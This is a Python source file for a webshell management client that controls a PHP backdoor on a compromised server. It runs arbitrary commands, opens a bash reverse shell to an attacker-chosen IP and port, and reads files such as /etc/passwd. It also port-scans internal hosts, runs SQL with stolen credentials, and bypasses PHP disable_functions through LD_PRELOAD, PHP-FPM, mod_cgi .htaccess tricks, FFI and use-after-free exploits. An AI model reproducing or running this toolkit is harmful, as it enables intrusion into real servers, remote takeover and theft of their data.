import requests
import base64
import time
import random


class webshell:
    urls=''
    pwd=''
    cmd=''
    def __init__(self,Url,pwd,cmd,way):
        self.urls=Url
        self.pwd = pwd
        self.cmd = cmd
        self.way = way
    def random_string(self):
        return (''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 5)))

    def connection(self):
        url = "http://" + self.urls
        req = requests.head(url)
        code = req.status_code
        if (code == 200):
            return "success"
        else:
            return "false"

    def getusefunc(self):
        func = self.get_disable_function()
        dofunc=['system','passthru','popen',',exec','shell_exec']
        realfunc = ''
        for function in dofunc:
            if(function not in func):
                realfunc=function.replace(',','')
                break
        return realfunc

    def getversion(self):
        readfunc = self.getusefunc()
        if(readfunc=="exec"or readfunc=="shell_exec"):
            print("use the " + "\033[5;31m" + readfunc + " \033[0;36mbut its the best to reshell\033[0m\n")
        else:
            print("use the " + "\033[5;31m"+readfunc+"\033[0m\n")
        url = "http://" + self.urls
        if(readfunc !="popen"):
            data = {self.pwd: "echo "+readfunc+"('php -v');"}
        else:
            data={self.pwd:"$s1mple=popen('php -v','"+'r'+"');while(!feof($s1mple)) { echo fread($s1mple, 1024); } pclose($s1mple);"}
        if(self.way=="post"):
            res = requests.post(url=url,data=data)
        else:
            res = requests.get(url=url,params=data)
        rescon = res.content
        rescons = rescon.decode(encoding="utf-8")
        try:
            index = rescons.index("PHP")
            index1 = rescons.index("Technologies")
        except:
            index = rescons.index("by")
            index1 = rescons.index("Technologies")
        print(rescons[index:index1])

    def get_disable_function(self):
        token = self.random_string()
        payload = "echo " + token + ";echo ini_get('disable_functions');echo " + token + ";"
        result = self.get_result_from_server(payload,token)
        return result

    def base64encode(self,port,ip):
        port = port
        ip = ip
        command = self.bashreshell() % (ip, port)
        bcommand = command.encode(encoding="utf-8")

        return base64.b64encode(bcommand).decode(encoding="utf-8")

    def bashreshell(self):
        return "bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'"

    def reverse_shell(self,port,ip,cmd):
        usefunc = self.getusefunc()
        url = "http://" + self.urls
        if(usefunc != "popen"):
            data = {self.pwd: usefunc+"(base64_decode('"+self.base64encode(port,ip)+"'));"}
        else:
            data={self.pwd:"$s1mple=popen(base64_decode('"+self.base64encode(port,ip)+"'),'"+'r'+"');while(!feof($s1mple)) { echo fread($s1mple, 1024); } pclose($s1mple);"}
        if (self.way == "post"):
            requests.post(url, data=data)
        else:
            requests.get(url, params=data)

#多加入其他的一些bypass函数；非常规调用，在调用是会选择调用
    def connectionToresult(self,cmd):
        command = cmd
        realfunc = self.getusefunc()
        token = self.random_string()
        if(realfunc=="exec" or realfunc=="shell_exec"):
            data = "echo "+token+";"+"echo "+realfunc+"('"+command+"')"+";echo "+token+";"
        elif(realfunc =="popen"):
            data="echo "+token+";$s1mple=popen('"+command+"','"+'r'+"');while(!feof($s1mple)) { echo fread($s1mple, 1024); } pclose($s1mple);echo "+token+";"
        else:
            data = "echo " + token + ";" + realfunc + "('" + command + "')" + ";echo " + token + ";"
        reqcons = self.get_reuslt_from_server_without_split(data)
        try:
            rere = reqcons.split(token, 2)[1]
        except:
            return("no result,maybe some waf or disable_functions")
        return(rere)

    def readfile(self,path):
        disfuc = self.get_disable_function()
        token = self.random_string()
        path = path
        if("file_get_contents" not in disfuc):
            data = "echo "+token+";echo file_get_contents('"+path+"');echo "+token+";"
        elif("fopen" not in disfuc and "fread" not in disfuc and "fclose"not in disfuc):
            data = "echo "+token+";$filename = '/etc/passwd';\n$handle = fopen($filename, 'r');\n$contents = fread($handle, filesize ($filename));\nfclose($handle);\necho $contents;echo "+token+";"
        elif("File" not in disfuc):
            data = "echo "+token+";var_dump(File('"+path+"'));echo "+token+";"
        elif("highlight_file" not in disfuc):
            data = "echo "+token+";highlight_file('"+path+"');echo "+token+";"
        else:
            return "cant readfile"
        reqcons = self.get_reuslt_from_server_without_split(data)
        try:
            rere = reqcons.split(token, 2)[1]
        except:
            return('\033[5;31m[+]the file is null or the file is not exit or you have no permission\033[0m')

        return rere


    def phpportscan(self,ip):
        token = self.random_string()
        ports = ['21','23','25','79','80','110','135','137','138','139','143','443','445','1433','3306','3389','65534','9000']
        for port in ports:
            payload = "$ip='{}';$port ={};$fp = @fsockopen($ip, $port, $errno, $errstr, 1);$result = $fp?'开启' : '关闭';echo '{}'.$result .'{}';".format(ip,ports,token,token)
            try:
                result = self.get_result_from_server(payload,token)
                print(port,result)
            except:
                return "cant scan"
        return "over"
    def down_load_file(self,path,name):
        content = self.readfile(path).encode(encoding="utf-8")
        contents = base64.b64encode(content)
        if(contents != ''):
            files = open(name,'w')
            files.write(base64.b64decode(contents).decode(encoding="utf-8"))
            files.close()
            return "success to download"
        else:
            return "fail to download"

    def bypass_PRELOAD(self):
        cant_use_func = self.get_disable_function()
        if("putenv"  not in cant_use_func):
            if("mail" not in cant_use_func or "error_log" not in cant_use_func):
                print("bypassing ........")
        else:
            print("noooo,the way is bad")
            return None
        token = self.random_string()
        a = open('bypass/LD_PRELOAD/s1mple.so', 'rb')
        b = (base64.b64encode(a.read())).decode(encoding="utf-8")
        a.close()
        bypass_phpini = self.change_phpini().encode(encoding="utf-8")
        base64_phpini = base64.b64encode(bypass_phpini)
        attack_php_ini = base64_phpini.decode(encoding="utf-8")
        url = "http://" + self.urls
        data = {self.pwd:"file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
        php_payload = '<?php\nputenv("LD_PRELOAD=/tmp/s1mple.so");\nerror_log("",1,"","");\nmail("","","","");\necho "success";\n?>'
        data1 = {self.pwd: "file_put_contents('/tmp/s1mple.php','" + php_payload + "');"}
        if(self.way=="get"):
            requests.get(url, params=data)
            requests.get(url, params=data1)
        else:
            requests.post(url=url,data=data)
            requests.post(url=url, data=data1)
        data2 = {self.pwd:"echo "+token+";include('/tmp/s1mple.php');echo "+token+";"}#执行恶意命令；
        upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
        test_url = self.urls[::-1]
        try:
            test_int = test_url.index("/")
        except:
            test_int = 0
        d = len(self.urls)
        leng = d-test_int
        shell_name = self.urls[leng::]
        if (shell_name==''):
            shell_name = "index.php"
        else:
            shell_name = shell_name
        upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php", "/" + shell_name).encode(encoding="utf-8")
        upload_proxy.close()
        upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
        data3 = {self.pwd: "echo "+token+";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo "+token+";"}
        data4 = {self.pwd: "echo "+token+";file_put_contents('/tmp/php.ini',base64_decode('" + attack_php_ini + "'));echo "+token+";"}
        if(self.way=="get"):
            requests.get(url,params=data4)
            print("start upload proxy-file")
            requests.get(url, params=data3)
        else:
            requests.post(url=url,data=data4)
            print("start upload proxy-file")
            requests.post(url=url, data=data3)
        try:
            if(self.way=="post"):
                requests.post(url=url,data=data2,timeout=1.5)
                print("server new ports cant start;so cant use this bypass;please choose other")
            else:
                requests.get(url=url, params=data2, timeout=1.5)
                print("server new ports cant start;so cant use this bypass;please choose other(post shell)")
        except:
            print("The malicious port has been opened : 65534")
            shell_url = "http://"+self.urls+"/../"+"s1mple.php"
            token = self.random_string()
            while True:
                command = input("please input the command :")
                if(command=="exit"):
                    exit()
                result_data = "echo %s;"%token+"system('"+command+"');echo %s;"%token
                reqcons = self.get_reuslt_from_server_without_split(result_data,shell_url)
                try:
                    rere = reqcons.split(token, 2)[1]
                except:
                    print("maybe the port is not open successly")
                    break
                print(rere)

    def test(self):
        token = self.random_string()
        url = "http://" + self.urls
        data = {self.pwd: "echo "+token+";echo php_ini_loaded_file();echo "+token+";"}
        res = requests.post(url=url,data=data)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        rere = reqcons.split(token, 2)[1]
        return rere
    def change_phpini(self):

        path = self.test()
        content = self.readfile(path)
        contents = content.replace("disable_functions",";disable_functions")
        return contents
        #str

    def get_document_root(self):
        token = self.random_string()
        url = "http://"+self.urls
        data = {self.pwd:"echo "+token+";echo $_SERVER['DOCUMENT_ROOT'];echo "+token+";"}
        res = requests.post(url = url,data=data)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        path = reqcons.split(token, 2)[1]
        return path

    def get_path(self):
        token = self.random_string()
        a = self.urls.index("/")
        b = self.urls[a+1::]
        document_root = self.get_document_root()
        file_path = document_root+b
        url = "http://"+self.urls
        data = {self.pwd:"echo "+token+";echo dirname('"+file_path+"');echo "+token+";"}
        res = requests.post(url=url,data=data)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        path = reqcons.split(token, 2)[1]
        return path

    def bool_write(self):
        token = self.random_string()
        path = self.get_path()
        url = "http://"+self.urls
        data = {self.pwd:"echo "+token+";echo is_writable('"+path+"');echo "+token+";"}
        res = requests.post(url=url,data=data)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        result = reqcons.split(token, 2)[1]
        if(result=='1'):
            return True
        else:
            return False

    def type_server(self):
        token = self.random_string()
        url = "http://"+self.urls
        data = {self.pwd:"echo "+token+";echo $_SERVER['SERVER_SOFTWARE'];echo "+token+";"}
        res = requests.post(url=url, data=data)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        result = reqcons.split(token, 2)[1]
        #print(result)
        return result

    def htaccess_test(self):
        token = self.random_string()
        url = "http://" + self.urls
        data = {self.pwd: "@file_put_contents('.htaccess','\nSetEnv HTACCESS on',FILE_APPEND);"}
        data1 = {self.pwd: "echo " + token + ";echo $_SERVER['HTACCESS'];echo " + token + ";"}
        if(self.way=="post"):
            requests.post(url=url,data=data)#写入.htaccess
            res = requests.post(url=url, data=data1)
        else:
            requests.get(url,params=data)#写入.htaccess
            res = requests.post(url=url, data=data1)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        try:
            result = reqcons.split(token, 2)[1]
        except:
            exit("noooo;something error")
        if(result=="on"):
            return True
        else:
            return False

    def bypass_Apache_Mod_CGI(self):
        token = self.random_string()
        url = "http://"+self.urls
        shell_url = url+"/../s1mple.su"
        data = {self.pwd:"echo "+token+";echo in_array('mod_cgi', apache_get_modules());echo "+token+";"}
        if(self.way=="post"):
            res = requests.post(url=url, data=data)
        else:
            res = requests.get(url, params=data)
        reqconss = res.content
        reqcons = reqconss.decode(encoding="utf-8")
        result = reqcons.split(token, 2)[1]
        server_type = self.type_server()
        if(result=='1'):
            print("cgi_is_used")
            if("Apache" in server_type):
                print("the server is apache")
                if(self.bool_write):
                    print("the dir can write something")
                    if(self.htaccess_test()):
                        datas={self.pwd:"copy('.htaccess', '.htaccess.bak');"}
                        datass = {
                            self.pwd: 'file_put_contents(".htaccess","Options +ExecCGI\nAddHandler cgi-script .su\n");'}
                        if(self.way=="post"):
                            requests.post(url=url,data=datas)#备份文件
                            requests.post(url=url, data=datass)  # 写入.htaccess控制解析
                        else:
                            requests.get(url, params=datas)  # 备份文件
                            requests.get(url, params=datass)  # 写入.htaccess控制解析
                        while True:
                            command = input("please input your command : ")
                            if(command=="exit"):
                                exit("Shell-hack has exited")
                            shell_data = {self.pwd:"file_put_contents('s1mple.su','#!/bin/sh\necho Content-type: text/html\necho ""\necho&&%s');chmod('s1mple.su',0755);"%command}
                            if(self.way=="post"):
                                requests.post(url=url,data=shell_data)
                            else:
                                requests.get(url, params=shell_data)
                            response = requests.get(shell_url)
                            print(response.content)
    def bypass_php_fpm(self):
        cant_use_func = self.get_disable_function()
        if ("file_put_contents" not in cant_use_func):
            if ("include" not in cant_use_func):
                print("bypassing ........")
        else:
            print("noooo,the way is bad")
            return None
        token = self.random_string()
        a = open('bypass/PHP_FPM/s1mple.so', 'rb')
        b = (base64.b64encode(a.read())).decode(encoding="utf-8")
        a.close()
        url = "http://" + self.urls
        data = {self.pwd: "file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
        requests.post(url=url, data=data)
        data2 = {self.pwd: "echo " + token + ";include('/tmp/s1mple.php');echo " + token + ";"}  # 执行恶意命令；
        upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
        test_url = self.urls[::-1]
        try:
            test_int = test_url.index("/")
        except:
            test_int = 0
        d = len(self.urls)
        leng = d - test_int
        shell_name = self.urls[leng::]
        if (shell_name == ''):
            shell_name = "index.php"
        else:
            shell_name = shell_name
        upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php",
                                                                                    "/" + shell_name).encode(
            encoding="utf-8")
        upload_proxy.close()
        upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
        data3 = {
            self.pwd: "echo " + token + ";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo " + token + ";"}
        print("start upload proxy-file")
        requests.post(url=url, data=data3)
        try:
            payloads = ["unix:///var/run/php5-fpm.sock","127.0.0.1:9000","unix:///var/run/php/php5-fpm.sock","unix:///var/run/php-fpm/php5-fpm.sock","unix:///var/run/php/php7-fpm.sock","/var/run/php/php7.2-fpm.sock","/usr/local/var/run/php7.3-fpm.sock","localhost:9000"]
            for test in payloads:
                php_payload = open('bypass/PHP_FPM/s1mple', 'rb')
                php_base = (base64.b64encode(
                    php_payload.read().decode(encoding="utf-8").replace("the_way_to_the_fpm", test).encode(
                        encoding="utf-8"))).decode(encoding="utf-8")
                php_payload.close()
                data1 = {self.pwd: "file_put_contents('/tmp/s1mple.php',base64_decode('" + php_base + "'));"}
                requests.post(url=url, data=data1)  # 写入攻击fpm的脚本文件
                requests.post(url=url, data=data2, timeout=2)
                print("trying other ways,please wait.....")
        except:
            print("The malicious port has been opened : 65534")
            shell_url = "http://" + self.urls + "/../" + "s1mple.php"
            token = self.random_string()
            while True:
                command = input("please input the command :")
                if (command == "exit"):
                    exit()
                result_data = {self.pwd: "echo %s;" % token + "system('" + command + "');echo %s;" % token}
                resul = requests.post(url=shell_url, data=result_data)
                reqconss = resul.content
                reqcons = reqconss.decode(encoding="utf-8")
                rere = reqcons.split(token, 2)[1]
                # return rere
                print(rere)


    def bypass_by_pwn(self,cmd):
        disable = self.get_disable_function()
        url = "http://" + self.urls
        if(cmd=="bypass Backtrace UAF"):
            path = "bypass/Backtrace_UAF/exp"
        if(cmd=="bypass Json Serializer UAF"):
            path = "bypass/Json_Serializer_UAF/exp"
        if(cmd=="bypass GC UAF"):
            path = "bypass/GC-UAF/exp"
        if ("file_put_contents" not in disable):
            print("you can try try")
        while True:
            command = input('please input the command :')
            if (command == "exit"):
                break
            payload = open(path, 'rb').read().decode(encoding="utf-8")
            exec_payload = payload.replace('s1mple_su', command).encode(encoding="utf-8")
            base64pay = base64.b64encode(exec_payload).decode(encoding="utf-8")
            data = {self.pwd: "file_put_contents('s1mple.php',base64_decode('" + base64pay + "'));"}
            if(self.way=="post"):
                requests.post(url=url, data=data)
            else:
                requests.get(url, params=data)
                print("\033[0;31m[+]  maybe cant success;because the content is so big;but get cant transfer so big contents\033[0m")
                print("\033[0;32m[+]so;maybe you need a post type webshell\033[0m")
            print(self.execute(exec_payload.decode(encoding="utf-8")))

    def execute(self,payload):
        url = "http://" + self.urls
        pwd = self.pwd
        result_url = url + "/s1mple.php"
        way = self.way
        payload = payload
        if(way=="post"):
            data = {pwd:payload}
            requests.post(url=url,  data=data)
            result = requests.get(result_url)
            rere = result.content.decode(encoding="utf-8")
            return rere
        else:
            url = "http://" + self.urls+"?"+self.pwd+"="
            data = payload
            exec = url+data
            requests.get(exec)
            resul = requests.get(result_url)
            reqconss = resul.content.decode(encoding="utf-8")
            return reqconss

    def bypass_php_ffi(self):
        token = self.random_string()
        cant_use_func = self.get_disable_function()
        if ("file_put_contents" not in cant_use_func):
            while True:
                command = input("please input the command you want : ")
                if(command=="exit"):
                    exit()
                else:
                    payload="<?php\n$ffi = FFI::cdef('int system(const char *command);');$ffi->system('{} > /tmp/s1mple');echo file_get_contents('/tmp/s1mple');@unlink('/tmp/s1mple');".format(command).encode(encoding="utf-8")
                    base_payload = base64.b64encode(payload)
                    pay = base_payload.decode(encoding="utf-8")
                    payloads = "file_put_contents('s1mple.php',base64_decode('"+pay+"'));"
                    print(self.execute(payloads))

    def get_reuslt_from_server_without_split(self,payload,shell_url=None):
        if(shell_url==None):
            url = "http://" + self.urls
        else:
            url = shell_url
        data = {self.pwd: payload}
        if (self.way == "post"):
            resul = requests.post(url=url, data=data)
        else:
            resul = requests.get(url, params=data)
        reqconss = resul.content
        reqcons = reqconss.decode(encoding="utf-8")
        return reqcons
    def get_result_from_server(self,payload,token):
        url = "http://" + self.urls
        data = {self.pwd:payload}
        if(self.way=="post"):
            resul = requests.post(url=url,data=data)
        else:
            resul = requests.get(url, params=data)
        reqconss = resul.content
        reqcons = reqconss.decode(encoding="utf-8")
        try:
            rere = reqcons.split(token,2)[1]
        except:
            return reqcons
        return rere


    def mysql_test_connect(self,uname,password):
        token = self.random_string()
        payload = "echo "+token+";$con = mysqli_connect('127.0.0.1','{}','{}');if (!$con){{die('Could not connect: ');}}else{{die('success');}};echo ".format(uname,password)+token+";"
        result = self.get_result_from_server(payload,token)
        if("success" in result):
            return True
        else:
            print("\033[5;31mconnect fail;maybe the mysql port is close;you can try to portscan\033[0m")
            return False

    def exec_sql(self,uname,password):
        if(self.mysql_test_connect(uname,password)):
            print("\033[0;32mconnect success! you can hack")
            time.sleep(0.5)
            while True:
                sql_payload = input("please input the sql_payload -->")
                if(sql_payload=="exit"):
                    break
                if(sql_payload==''):
                    continue
                token = self.random_string()
                payloads = "echo "+token+";$connection=mysqli_connect('127.0.0.1', '{}', '{}', 'mysql');$query=mysqli_query($connection,'{}');while ($row=mysqli_fetch_assoc($query)) {{var_dump($row);}};echo ".format(uname,password,sql_payload)+token+";"
                result = self.get_result_from_server(payloads,token)
                print(result)


